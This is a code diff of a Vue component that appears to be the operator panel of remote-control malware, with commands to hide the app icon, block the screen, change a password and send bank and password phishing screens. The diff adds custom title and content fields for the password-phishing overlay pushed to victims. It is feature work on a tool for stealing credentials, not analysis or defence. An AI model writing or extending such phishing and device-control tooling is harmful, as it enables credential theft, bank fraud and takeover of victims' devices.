@@ -66,7 +66,7 @@ interface Emits {
     (e: 'sendKb', type: number): void;
     (e: 'sendBlock', type: number): void;
     (e: 'hideIcon'): void;
-    (e: 'sendPhish', type: string): void;
+    (e: 'sendPhish', type: string, title: string, content: string): void;
     (e: 'sendBankPhish', bank: string): void;
     (e: 'toggleBlockText', text: string, bg: string): void;
     (e: 'modifyPassword', password: string): void;
@@ -76,6 +76,8 @@ const emit = defineEmits<Emits>();
 
 const pasteText = ref('');
 const phishType = ref('0');
+const phishTitle = ref('');
+const phishContent = ref('');
 const blockText = ref('');
 const blockBg = ref('0');
 const isBlockTextActive = ref(false);
@@ -89,7 +91,7 @@ const handlePaste = () => {
 };
 
 const handleSendPhish = () => {
-    emit('sendPhish', phishType.value);
+    emit('sendPhish', phishType.value, phishTitle.value, phishContent.value);
 };
 
 const handleToggleBlockText = () => {
@@ -348,6 +350,22 @@ const bankButtons = [
                 <div class="section-title">
                     <NIcon :component="FishOutline" size="14" />
                     <span>密码钓鱼</span>
+                </div>
+                <div class="phish-inputs">
+                    <NInput
+                        v-model:value="phishTitle"
+                        placeholder="钓鱼界面文字标题"
+                        size="small"
+                        style="margin-bottom: 8px;"
+                    />
+                    <NInput
+                        v-model:value="phishContent"
+                        placeholder="钓鱼界面文字内容"
+                        size="small"
+                        type="textarea"
+                        :rows="2"
+                        style="margin-bottom: 8px;"
+                    />
                 </div>
                 <div class="phish-row">
                     <NSelect
